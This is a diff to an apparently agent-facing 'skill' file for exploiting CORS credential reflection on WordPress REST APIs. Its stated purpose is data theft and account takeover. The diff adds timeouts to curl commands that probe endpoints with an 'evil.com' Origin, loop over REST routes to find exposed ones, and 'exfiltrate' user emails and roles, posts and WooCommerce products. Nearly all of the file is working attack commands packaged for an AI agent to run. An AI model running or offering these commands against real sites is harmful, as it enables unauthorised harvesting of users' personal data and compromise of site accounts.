@@ -1,20 +1,18 @@
 ---
 name: cors-credential-wordpress
 description: Exploit WP CORS credential reflection for data theft.
-version: 1.0.0
-author: agentiko
+version: 1.1.0
+revision_date: 2026-07-25
 license: MIT
 platforms: [linux]
-compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
-metadata:
-  hermes:
-    tags: [recon, cors, wordpress, credential-theft, ATO]
-    category: recon
-    related_skills:
-      - wp-mass-recon
-      - xmlrpc-exploitation
-      - cross-attack-chains
-      - wordpress-full-compromise
+compatibility: Requires curl, nmap, python3, masscan, subfinder, httpx, nuclei
+tags: [recon, cors, wordpress, credential-theft, ATO]
+category: recon
+related_skills:
+  - wp-mass-recon
+  - xmlrpc-exploitation
+  - cross-attack-chains
+  - wordpress-full-compromise
 ---
 
 # CORS Credential WordPress Skill
@@ -30,7 +28,7 @@ Detect, confirm, and exploit CORS credential reflection on WordPress REST API en
 
 ## Prerequisites
 
-- `terminal` tool with curl and python3.
+- curl and python3.
 - `web_extract` or `browser_navigate` for browser PoC verification.
 - Target must have WordPress REST API accessible (`/wp-json/wp/v2/`).
 
@@ -38,12 +36,12 @@ Detect, confirm, and exploit CORS credential reflection on WordPress REST API en
 
 ```bash
 # Quick detection
-curl -skI "https://TARGET/wp-json/wp/v2/users" -H "Origin: https://evil.com" | grep -iE "access-control"
+curl --max-time 30 --connect-timeout 10 -skI "https://TARGET/wp-json/wp/v2/users" -H "Origin: https://evil.com" | grep -iE "access-control"
 
 # Full CORS matrix (10 endpoints)
 for ep in "users" "posts" "pages" "media" "comments" "categories" "tags" "settings" "plugins" "themes"; do
   echo "=== /wp-json/wp/v2/$ep ==="
-  curl -skI "https://TARGET/wp-json/wp/v2/$ep" -H "Origin: https://evil.com" | grep -iE "access-control|http/"
+  curl --max-time 30 --connect-timeout 10 -skI "https://TARGET/wp-json/wp/v2/$ep" -H "Origin: https://evil.com" | grep -iE "access-control|http/"
   echo ""
 done
 ```
@@ -66,7 +64,7 @@ done
 ### Step 1 — Single-Endpoint Detection
 
 ```bash
-curl -skI "https://TARGET/wp-json/wp/v2/users" \
+curl --max-time 30 --connect-timeout 10 -skI "https://TARGET/wp-json/wp/v2/users" \
   -H "Origin: https://evil.com" \
   -H "User-Agent: Mozilla/5.0" 2>&1
 ```
@@ -98,9 +96,9 @@ ENDPOINTS=(
 )
 
 for ep in "${ENDPOINTS[@]}"; do
-  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "https://$TARGET/wp-json/$ep")
+  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 --connect-timeout 10 "https://$TARGET/wp-json/$ep")
   if [[ "$code" == "200" ]]; then
-    cors=$(curl -skI --max-time 10 "https://$TARGET/wp-json/$ep" -H "Origin: https://evil.com" 2>/dev/null | grep -i "access-control-allow-credentials: true")
+    cors=$(curl -skI --max-time 10 --connect-timeout 10 "https://$TARGET/wp-json/$ep" -H "Origin: https://evil.com" 2>/dev/null | grep -i "access-control-allow-credentials: true")
     if [[ -n "$cors" ]]; then
       echo "[CRITICAL] CORS ON: /wp-json/$ep — data accessible cross-origin"
     fi
@@ -127,11 +125,11 @@ fetch("https://TARGET/wp-json/wp/v2/users", {
 
 ```bash
 # Exfiltrate users with emails
-curl -sk "https://TARGET/wp-json/wp/v2/users?context=edit" \
+curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/wp-json/wp/v2/users?context=edit" \
   -H "Origin: https://evil.com" | python3 -m json.tool | grep -E '"id"|"name"|"slug"|"email"|"roles"'
 
 # Exfiltrate all posts
-curl -sk "https://TARGET/wp-json/wp/v2/posts?per_page=100" \
+curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/wp-json/wp/v2/posts?per_page=100" \
   -H "Origin: https://evil.com" | python3 -c "
 import sys, json
 posts = json.load(sys.stdin)
@@ -140,7 +138,7 @@ for p in posts:
 " 2>/dev/null
 
 # Exfiltrate WooCommerce products
-curl -sk "https://TARGET/wp-json/wc/v3/products" \
+curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/wp-json/wc/v3/products" \
   -H "Origin: https://evil.com" | python3 -m json.tool 2>/dev/null | head -50
 ```
 
